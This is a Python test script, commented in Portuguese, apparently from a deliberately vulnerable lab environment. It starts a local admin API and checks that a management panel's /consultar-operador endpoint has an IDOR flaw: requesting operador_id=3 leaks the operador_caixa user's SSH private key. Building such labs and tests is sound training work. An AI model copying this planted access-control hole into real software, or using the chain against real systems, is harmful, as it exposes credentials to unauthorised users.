"""Teste de camada 2: usa app.test_client() do painel de gerenciamento para
validar a cadeia IDOR, com a admin-api rodando como processo real (a
requisição sai de verdade pela rede, então não dá para usar test_client dos
dois lados).

Confirma que o painel repassa a consulta e expõe a credencial do
operador_caixa via POST /consultar-operador com operador_id=3.
"""

import os
import subprocess
import sys
import time

import requests

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
ADMIN_API_DIR = os.path.join(TESTS_DIR, "..", "services", "admin-api")
PAINEL_DIR = os.path.join(TESTS_DIR, "..", "services", "painel-gerenciamento")
ADMIN_API_PORT = 9090

sys.path.insert(0, PAINEL_DIR)
import app as painel_app  # noqa: E402


def subir_admin_api():
    processo = subprocess.Popen(
        [sys.executable, "app.py"],
        cwd=ADMIN_API_DIR,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    for _ in range(30):
        try:
            requests.get(f"http://127.0.0.1:{ADMIN_API_PORT}/healthz", timeout=0.5)
            return processo
        except requests.RequestException:
            time.sleep(0.2)
    processo.terminate()
    raise RuntimeError("admin-api não respondeu a tempo")


def main():
    processo_admin_api = subir_admin_api()
    try:
        client = painel_app.app.test_client()

        # POST /consultar-operador com operador_id=3 → deve expor credencial
        resposta = client.post(
            "/consultar-operador",
            data={"operador_id": "3"},
        )
        corpo = resposta.get_data(as_text=True)

        assert resposta.status_code == 200, f"status inesperado: {resposta.status_code}"
        assert "operador_caixa" in corpo, "usuario operador_caixa não encontrado na resposta do painel"
        assert "BEGIN OPENSSH PRIVATE KEY" in corpo, "chave SSH privada não encontrada na resposta do painel"

        print("[OK] POST /consultar-operador com operador_id=3 retorna credencial do operador_caixa.")
        print("[OK] Etapa 3 (IDOR) validada na camada Flask: painel -> admin-api -> credencial vazada.")

    finally:
        processo_admin_api.terminate()
        processo_admin_api.wait(timeout=5)


if __name__ == "__main__":
    main()
